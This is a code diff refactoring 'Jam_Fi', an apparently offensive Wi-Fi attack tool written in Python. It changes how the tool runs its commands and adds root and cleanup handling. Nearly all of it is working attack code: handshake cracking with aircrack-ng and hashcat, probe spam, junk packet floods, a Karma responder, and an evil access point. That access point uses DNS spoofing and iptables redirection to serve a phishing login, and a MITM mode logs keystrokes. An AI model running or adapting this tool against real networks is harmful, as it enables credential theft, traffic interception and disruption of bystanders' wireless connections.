@@ -2,10 +2,32 @@
 import os
 import sys
 import time
+import subprocess
 from scapy.all import *
 from threading import Thread
 from random import choice, randint
 from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
+
+
+def require_root():
+    if os.geteuid() != 0:
+        print("⚠️ Jam_Fi must be run as root.")
+        sys.exit(1)
+
+def cleanup_services(iface=None):
+    """Stop network services and flush iptables."""
+    for cmd in [
+        "pkill -f hostapd",
+        "pkill -f dnsmasq",
+        "pkill -f dnsspoof",
+        "pkill -f phish_server.py",
+        "iptables -t nat -F",
+    ]:
+        subprocess.run(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    if iface:
+        subprocess.run(["ip", "link", "set", iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "addr", "flush", "dev", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(["ip", "link", "set", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 seen_aps = {}
 clients = {}
@@ -31,7 +53,7 @@ def print_banner():
 def channel_hopper(iface):
     while True:
         for ch in range(1, 14):
-            os.system(f"iwconfig {iface} channel {ch}")
+            subprocess.run(["iwconfig", iface, "channel", str(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(0.3)
 
 def packet_handler(pkt):
@@ -125,18 +147,19 @@ def crack_handshakes():
     
     if method == "1":
         print(" Launching Aircrack-ng...")
-        os.system(f"aircrack-ng {pcap_file} -w {wordlist}")
+        subprocess.run(f"aircrack-ng {pcap_file} -w {wordlist}", shell=True)
     elif method == "2":
         hccapx = pcap_file.replace(".pcap", ".hccapx")
         print("🔄 Converting pcap to hccapx...")
-        os.system(f"cap2hccapx {pcap_file} {hccapx}")
+        subprocess.run(f"cap2hccapx {pcap_file} {hccapx}", shell=True)
         print(" Launching Hashcat...")
-        os.system(f"hashcat -m 2500 {hccapx} {wordlist} --force")
+        subprocess.run(f"hashcat -m 2500 {hccapx} {wordlist} --force", shell=True)
     else:
         print("⚠️ Invalid choice.")
 
-def probe_spammer():
-    iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
+def probe_spammer(iface=None):
+    if iface is None:
+        iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
     ssids = ["FreeWiFi", "Starbucks", "McDonald's", "Xfinity", "SchoolWiFi", "UnicornNet"]
     print("📡 Spamming probe requests...")
     while True:
@@ -146,18 +169,20 @@ def probe_spammer():
             sendp(pkt, iface=iface, verbose=0)
         time.sleep(0.2)
 
-def junk_flood():
-    iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
+def junk_flood(iface=None):
+    if iface is None:
+        iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
     print("💣 Sending junk packets...")
     while True:
         pkt = RadioTap()/Dot11(addr1=RandMAC(), addr2=RandMAC(), addr3=RandMAC())/Raw(load=os.urandom(50))
         sendp(pkt, iface=iface, verbose=0)
 
-def karma_responder():
-    iface = input(" Monitor mode interface (e.g. wlan0mon): ").strip()
+def karma_responder(iface=None):
+    if iface is None:
+        iface = input(" Monitor mode interface (e.g. wlan0mon): ").strip()
     print("🧲 Karma responder: answering all probe requests...")
     def handle(pkt):
-        if pkt.haslayer(Dot11ProbeReq):
+        if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11Elt):
             ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "FreeWiFi"
             resp = RadioTap()/Dot11(type=0, subtype=8, addr1=pkt.addr2,
                 addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID=0, info=ssid)
@@ -167,9 +192,13 @@ def karma_responder():
 
 def chaos_mode():
     print("💃 Chaos Mode Engaged!")
-    Thread(target=probe_spammer).start()
-    Thread(target=junk_flood).start()
-    Thread(target=karma_responder).start()
+    iface = input(" Enter monitor mode interface (e.g. wlan0mon): ").strip()
+    if not iface:
+        print("⚠️ Interface not entered.")
+        return
+    Thread(target=probe_spammer, args=(iface,), daemon=True).start()
+    Thread(target=junk_flood, args=(iface,), daemon=True).start()
+    Thread(target=karma_responder, args=(iface,), daemon=True).start()
 
 def evil_ap_mode():
     print("👿 Starting Fully Connectable Evil AP Mode...")
@@ -180,16 +209,13 @@ def evil_ap_mode():
     os.makedirs("loot", exist_ok=True)
 
     print("🧹 Cleaning up old services...")
-    os.system("sudo pkill -f hostapd")
-    os.system("sudo pkill -f dnsmasq")
-    os.system("sudo pkill -f dnsspoof")
-    os.system("sudo pkill -f phish_server.py")
+    cleanup_services(iface)
 
     print("🌐 Configuring network interface...")
-    os.system(f"sudo ip link set {iface} down")
-    os.system(f"sudo ip addr flush dev {iface}")
-    os.system(f"sudo ip addr add 10.0.0.1/24 dev {iface}")
-    os.system(f"sudo ip link set {iface} up")
+    subprocess.run(f"sudo ip link set {iface} down", shell=True)
+    subprocess.run(f"sudo ip addr flush dev {iface}", shell=True)
+    subprocess.run(f"sudo ip addr add 10.0.0.1/24 dev {iface}", shell=True)
+    subprocess.run(f"sudo ip link set {iface} up", shell=True)
 
     hostapd_conf = f"""
 interface={iface}
@@ -219,24 +245,33 @@ log-dhcp
 
     # Start services
     print(f"📶 Starting Evil AP on {iface} with SSID: {ssid}")
-    os.system(f"sudo hostapd loot/hostapd.conf &")
+    subprocess.Popen(f"sudo hostapd loot/hostapd.conf", shell=True)
     time.sleep(2)
 
     print("🧠 Launching dnsmasq...")
-    os.system(f"sudo dnsmasq -C loot/dnsmasq.conf &")
+    subprocess.Popen(f"sudo dnsmasq -C loot/dnsmasq.conf", shell=True)
 
     print("💻 Hosting phishing login at http://10.0.0.1 ...")
-    os.system("sudo python3 phish_server.py &")
+    subprocess.Popen("sudo python3 phish_server.py", shell=True)
 
     print("🔀 Enabling HTTP redirection with iptables...")
-    os.system("sudo iptables -t nat -F")
-    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
-    os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")
+    subprocess.run("sudo iptables -t nat -F", shell=True)
+    subprocess.run("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80", shell=True)
+    subprocess.run("sudo iptables -t nat -A POSTROUTING -j MASQUERADE", shell=True)
 
     print("🎯 Launching dnsspoof to redirect all DNS to 10.0.0.1")
     with open("loot/dnsspoof_hosts", "w") as f:
         f.write("10.0.0.1 *\n")
-    os.system(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts &")
+    subprocess.Popen(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts", shell=True)
+
+    print("Press CTRL+C to stop Evil AP.")
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("🛑 Evil AP stopped.")
+    finally:
+        cleanup_services(iface)
 
 def mitm_hid_injection():
     import datetime
@@ -273,14 +308,11 @@ def mitm_hid_injection():
     keystroke_log = f"keystroke_log_{timestamp}.txt"
 
     # 🌐 Set up network
-    os.system("sudo pkill -f hostapd")
-    os.system("sudo pkill -f dnsmasq")
-    os.system("sudo pkill -f dnsspoof")
-    os.system("sudo pkill -f phish_server.py")
-    os.system(f"sudo ip link set {iface} down")
-    os.system(f"sudo ip addr flush dev {iface}")
-    os.system(f"sudo ip addr add 10.0.0.1/24 dev {iface}")
-    os.system(f"sudo ip link set {iface} up")
+    cleanup_services(iface)
+    subprocess.run(f"sudo ip link set {iface} down", shell=True)
+    subprocess.run(f"sudo ip addr flush dev {iface}", shell=True)
+    subprocess.run(f"sudo ip addr add 10.0.0.1/24 dev {iface}", shell=True)
+    subprocess.run(f"sudo ip link set {iface} up", shell=True)
 
     with open("loot/hostapd.conf", "w") as f:
         f.write(f"""
@@ -350,13 +382,13 @@ setTimeout(() => {{
     open(keystroke_log, "a").close()
 
     print(f"📶 Broadcasting SSID: {fake}")
-    os.system("sudo hostapd hostapd.conf &")
+    subprocess.Popen("sudo hostapd hostapd.conf", shell=True)
     time.sleep(2)
-    os.system("sudo dnsmasq -C dnsmasq.conf &")
-    os.system("sudo iptables -t nat -F")
-    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
-    os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")
-    os.system(f"sudo dnsspoof -i {iface} -f dnsspoof_hosts &")
+    subprocess.Popen("sudo dnsmasq -C dnsmasq.conf", shell=True)
+    subprocess.run("sudo iptables -t nat -F", shell=True)
+    subprocess.run("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80", shell=True)
+    subprocess.run("sudo iptables -t nat -A POSTROUTING -j MASQUERADE", shell=True)
+    subprocess.Popen(f"sudo dnsspoof -i {iface} -f dnsspoof_hosts", shell=True)
 
     class HIDHandler(BaseHTTPRequestHandler):
         def do_GET(self):
@@ -406,6 +438,8 @@ setTimeout(() => {{
         HTTPServer(("0.0.0.0", 80), HIDHandler).serve_forever()
     except KeyboardInterrupt:
         print("🛑 Server stopped.")
+    finally:
+        cleanup_services(iface)
 
 def main():
     print_banner()
@@ -437,10 +471,12 @@ def main():
         elif choice == "11": mitm_hid_injection()
         elif choice == "0":
             print("👋 Goodbye fren! XOXOXO 💜")
+            cleanup_services()
             sys.exit()
         else:
             print("⚠️ Invalid choice!")
 
 if __name__ == "__main__":
+    require_root()
     main()
 
